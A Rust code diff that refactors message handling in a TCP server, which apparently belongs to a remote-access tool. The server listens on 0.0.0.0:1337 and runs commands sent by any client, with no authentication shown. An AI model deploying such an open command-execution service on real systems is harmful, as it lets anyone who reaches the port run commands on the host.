@@ -1,5 +1,6 @@
 use crate::communication::messages::{
-    MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
+    Message, MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_HEADER_LENGTH,
+    MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
 };
 use crate::os;
 
@@ -8,9 +9,10 @@ use std::net::{Shutdown, TcpListener, TcpStream};
 use std::str::from_utf8;
 use std::thread;
 
-use crate::communication::serialization::get_msg_type_and_length;
+use crate::communication::serialization::extract_msg_type_and_length;
 use byteorder::{BigEndian, WriteBytesExt};
 use ron;
+use std::sync::mpsc::TryRecvError;
 
 const BIND_ADDR: &str = "0.0.0.0:1337";
 
@@ -30,46 +32,45 @@ fn run_command_message(request: RunCommandRequest) -> Result<RunCommandResponse,
     Ok(response)
 }
 
-fn handle_message(data: &[u8], msg_type: u8, mut stream: &TcpStream) {
-    if msg_type == MessageType::RunCommandType as u8 {
+fn handle_message(message: Message, mut stream: &TcpStream) {
+    if message.message_type == MessageType::RunCommandType as u8 {
         println!("Run command type!");
-        let request: RunCommandRequest = ron::de::from_bytes(data).unwrap();
+        let request: RunCommandRequest = ron::de::from_bytes(&message.serialized_message).unwrap();
         let response = run_command_message(request).unwrap();
         let serialized_message = ron::ser::to_string(&response).unwrap();
         let message_len = serialized_message.len();
         let message_type = MessageType::RunCommandType as u8;
 
-        let mut buffer: Vec<u8> =
-            Vec::with_capacity(message_len + MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE);
+        let mut buffer: Vec<u8> = Vec::with_capacity(message_len + MESSAGE_HEADER_LENGTH);
         buffer.push(message_type);
         buffer.write_u32::<BigEndian>(message_len as u32).unwrap();
         buffer.extend(serialized_message.into_bytes());
 
         println!("Buffer sending: {:?}", &buffer);
         stream.write(&buffer).unwrap();
-    } else if msg_type == MessageType::DownloadFileType as u8 {
+    } else if message.message_type == MessageType::DownloadFileType as u8 {
         println!("Download file type!")
     }
 }
 
-fn handle_client(mut stream: TcpStream) -> Result<(), Error> {
-    println!("Handling connection from {}", stream.peer_addr()?);
-    let mut type_and_length = [0 as u8; MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE];
-    while match stream.read(&mut type_and_length) {
-        Ok(size) => match size {
-            0 => false,
-            _ => {
-                let (msg_type, msg_length) = get_msg_type_and_length(type_and_length);
-                let mut message = vec![0; msg_length];
+fn get_message(mut stream: &TcpStream) -> Result<Message, Error> {
+    let mut type_and_length = [0 as u8; MESSAGE_HEADER_LENGTH];
+    match stream.read_exact(&mut type_and_length) {
+        Ok(()) => {
+            let (msg_type, msg_length) = extract_msg_type_and_length(type_and_length);
+            let mut message = vec![0; msg_length];
 
-                // Read_exact function guarantees that we will read exactly enough data to fill the buffer
-                stream
-                    .read_exact(&mut message)
-                    .expect("Could not read message after getting message metadata. Error: {}");
-                handle_message(&message, msg_type, &stream);
-                true
-            }
-        },
+            // Read_exact function guarantees that we will read exactly enough data to fill the buffer
+            stream
+                .read_exact(&mut message)
+                .expect("Could not read message after getting message metadata. Error: {}");
+            return Ok(Message {
+                message_type: msg_type,
+                serialized_message_length: msg_length,
+                serialized_message: message,
+            });
+            //                handle_message(&message, msg_type, &stream);
+        }
         Err(e) => {
             println!(
                 "An error occurred, terminating connection with {}. Error: {}",
@@ -77,7 +78,25 @@ fn handle_client(mut stream: TcpStream) -> Result<(), Error> {
                 e
             );
             stream.shutdown(Shutdown::Both)?;
-            false
+            return Err(e);
+        }
+    }
+    panic!("Unexpectedly exited stream read.");
+}
+
+fn handle_client(mut stream: TcpStream) -> Result<(), Error> {
+    println!("Handling connection from {}", stream.peer_addr()?);
+    while match get_message(&mut stream) {
+        Ok(message) => {
+            handle_message(message, &stream);
+            true
+        }
+        Err(e) => {
+            println!(
+                "An error occurred while trying to get message. Error: {}",
+                e
+            );
+            return Err(e);
         }
     } {}
     Ok(())
@@ -115,5 +134,5 @@ pub fn run_server() -> Result<(), Error> {
         }
     }
     // TODO catch this panic
-    panic!("Exit listener loop unexpectedly")
+    panic!("Server closed unexpectedly")
 }
